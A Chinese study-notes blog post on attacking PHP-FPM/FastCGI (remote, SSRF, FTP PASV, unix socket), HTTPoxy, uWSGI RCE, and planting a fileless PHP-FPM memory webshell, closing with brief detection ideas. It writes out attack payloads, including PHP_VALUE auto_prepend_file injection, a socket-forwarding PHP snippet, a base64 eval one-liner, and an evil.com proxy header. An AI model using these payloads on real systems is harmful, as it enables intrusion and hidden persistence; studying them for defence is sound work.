---
title: "PHP-FPM内存马&攻击CGI学习笔记"
slug: "php-fpm-mem-shell-study-notes"
description: "什么叫终身学习 就是学了忘 然后再学（bushi"
date: 2022-09-13T14:46:49+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["PHP", "php-fpm"]
draft: false
toc: true
---

看到带佬用php-fpm做内存马，于是把php-fpm和cgi相关的知识再拿出来学学学

## 攻击php-fpm

FastCGI是常见的webserver动态脚本执行模型之一，主要目的是将webserver和动态语言的执行分成两个不同的常驻进程，当webserver接收到动态脚本的请求，就通过fastcgi协议将请求通过网络转发给fastcgi进程（即fpm），处理之后再将结果传给webserver，然后webserver再输出给浏览器；这种模型下不需要嵌入脚本解释器到webserver中，增加伸缩性和可维护性

fpm的默认监听端口是9000，如果目标对外开放了9000端口，我们可以利用这个开放的fpm对其发送符合fastcgi协议的请求，当header中的type指定为4时 可以给php-fpn传递环境参数，包含以下的内容

```
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

其中`SCRIPT_FILENAME`就是php-fpm会去执行的文件，由于5.3.9版本引入了`security.limit_extensions`的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过`find / -name "*.php"`来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置`FASTCGI_PARAMS`来动态修改 php 的设置，可以利用这两项

```
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
# "allow_url_include = On\ndisable_functions = \nsafe_mode = Off"
# "allow_url_include = On\nextension = /path/to/abc.so"
```

来做到执行某php文件时自动包含 POST 内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写，但是可以修改open_basedir的值）

所以综上，我们的攻击思路就是伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload（利用`PHP_VALUE`和`PHP_ADMIN_VALUE`这两个可动态修改php设置的项），再发出去；根据目标又可以分成以下几种

- **远程攻击php-fpm**

p牛的php-fpm脚本直接嗦，可以执行任意php代码或加载恶意.so

- **SSRF攻击本地php-fpm**

用gopher打内网fpm9000，payload还是p牛的脚本

- **结合ftp&PASV mode攻击本地php-fpm（已知开放内网fpm端口）**

在受害者端模拟一个ftp-server（用来将我们希望执行的内容转发至fpm），在响应PASV命令（即切换被动模式时）返回`(127,0,0,1,0,12345)`来让ftp-data打向我们指定的内网12345端口；如果是EPSV mode，就不会在通信中有(ip, port)的值 只能把data打向控制连接的服务端的端口，解决方法：手动把EPSV命令的返回结果设为非229的值，那么php的ftp://就会使用PASV命令

之后用继续上面php-fpm的脚本，先覆盖掉原有open_basedir的设置再写入恶意.so，进行RCE

- **攻击unix-socket模式下的php-fpm**

由于unix-socket是读取/run/php/php7.4-fpm.sock进行内部通信，所以不能打远程的，我们用`stream_socket_client`建立一个unix-socket连接，然后写入tcp流来通信

```php
<?php $sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock,base64_decode($_POST['A']));var_dump(fread($sock, 4096));?>
```

## CGI HTTPoxy

> php<5.6.24
>
> 不止影响php，所有以CGI或Fastcgi运行的程序理论上都受到影响
>
> [httpoxy](https://httpoxy.org/)

根据RFC 3875的规定，CGI/FastCGI要将用户传入的所有http头都加上`HTTP_`前缀放入环境变量中，而恰好大多数类库会约定俗成地提取环境变量`HTTP_PROXY`作为程序HTTP代理地址，于是可以构造`Proxy: http://evil.com/`这样的请求头将使用缺陷类库的网站的代理设置为`http://evil.com/`

## uWSGI RCE

类似fastcgi，经常作为python应用容器启动，也支持加载perl/ruby/go等应用

漏洞的成因和上面那个很相似，在uwsgi的协议中允许通过变量来动态调整参数，其中`UWSG_FILE`参数可以用来忽略原有uWSGI绑定的app，设定一个新的文件进行加载执行（类似上面的`SCRIPT_FILENAME`）

同时uWSGI程序中默认注册了一系列schemes，导致可以进一步利用

```c
void uwsgi_setup_schemes() {
	uwsgi_register_scheme("emperor", uwsgi_scheme_emperor);
	uwsgi_register_scheme("http", uwsgi_scheme_http);
	uwsgi_register_scheme("data", uwsgi_scheme_data);
	uwsgi_register_scheme("sym", uwsgi_scheme_sym);
	uwsgi_register_scheme("section", uwsgi_scheme_section);
	uwsgi_register_scheme("fd", uwsgi_scheme_fd);
	uwsgi_register_scheme("exec", uwsgi_scheme_exec);
	uwsgi_register_scheme("call", uwsgi_scheme_call);
	uwsgi_register_scheme("callint", uwsgi_scheme_callint);
}

static char *uwsgi_scheme_exec(char *url, size_t *size, int add_zero) {
	int cpipe[2];
	if (pipe(cpipe)) {
		uwsgi_error("pipe()");
		exit(1);
	}
	uwsgi_run_command(url, NULL, cpipe[1]);
	char *buffer = uwsgi_read_fd(cpipe[0], size, add_zero);
	close(cpipe[0]);
	close(cpipe[1]);
	return buffer;
}
```

其中存在exec协议，结合前面的`UWSGI_FILE`变量，可以导致RCE

属于是和上面php-fpm无限类似，我们也可以找到一个可以访问到的uWSGI端口（uWSGI协议）并对其发送uWSGI协议的payload即可

例如目标主机上是这样的

```bash
uwsgi --socket :8001 --module project.wsgi
```

可以利用[uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)嗦

```bash
python uwsgi_exp.py -u x.x.x.x:8001 -c "echo '1111' > /tmp/test"
```

## php-fpm做内存马

内存马与常规的webshell最显著的区别在于删除上马凭借的文件后依旧存在于当前进程中，除非重启程序；抽象出我们的需求：

1. 让后门代码在内存中驻留
2. 可以通过正常的请求手段触发执行

对于第一点，本身我们的fastcgi(fpm)就是常驻内存的（也是优于传统cgi的地方），并且在一次fastcgi请求中经过`PHP_VALUE`或`PHP_ADMIN_VALUE`修改的php配置值在此fpm的生命周期内都会被保留下来

所以我们可以继续沿用上面攻击php-fpm的方法

```
'PHP_VALUE': 'auto_prepend_file = php://input'
```

但是这样的`php://input`需要解析每一次的代码，对于内存马来说相当失败，我们把它换成data协议固定下来

假设这里是**SSRF攻击本地php-fpm**的场景，我们继续用上面的脚本，稍作修改

- post换为get（不需要解析php://input

- `auto_prepend_file = \"data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\"`

其余的不变，依旧要指定一个服务端已存在的文件，之后通过这个`auto_prepend_file`就可以植入内存马

不过这样的方案也有一定的局限性，它是和服务端的php-fpm worker进程绑定的，如果服务器上有多个worker进程，我们需要多发送几次之前的请求，才可以让payload感染每一个进程

另一个需要注意的点是php-fpm.conf的一个配置项`pm.max_requests`，它定义了每一个 worker 进程最大处理多少请求，就会自动重启，避免内存泄漏，但是一旦重生我们的内存马也会失效，还好默认是0

我们可以根据wofeiwo师傅之前写的[fcgi_jailbreak.php](https://gist.github.com/wofeiwo/4f41381a388accbf91f8#file-fcgi_jailbreak-php)改造出fpm内存马一把梭的脚本，具体修改的地方就是上面的`php://input`改为一句话马

![image-20220913144342599.png](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220913144342599.png)

其余部分不变，继续用即可

## 查杀

不可避开的话题是内存马的查杀，由于它只是动态修改了内存中的 PHP 配置，我们也无法从`PHP.ini/.user.ini/php-fpm.conf`等文件内容中检测，真正添加内存马由于只需要对fpm监听的端口发送请求，因此也无法从webserver的accesslog中发现问题

或许可以通过rasp之类的工具检查`auto_prepend_file/auto_append_file/allow_url_inclue`配置的变化来做检测

个人认为可以通过流量的行为进行检查，当出现了rce相关的流量但没有文件马的时候就可以考虑是php-fpm的内存马了

----

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[PHP FastCGI 的远程利用](https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/php-fastcgi-remote-exploit.md)  |  [攻击 PHP-FPM 学习笔记](https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/)

[CVE-2016-5385](https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385)  |  [httpoxy](https://httpoxy.org/)  |  [HTTPOXY漏洞说明](https://www.laruence.com/2016/07/19/3101.html)

[uWSGI 远程代码执行漏洞](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md)

[利用 PHP-FPM 做内存马的方法](https://tttang.com/archive/1720/)

{{% /spoiler %}}
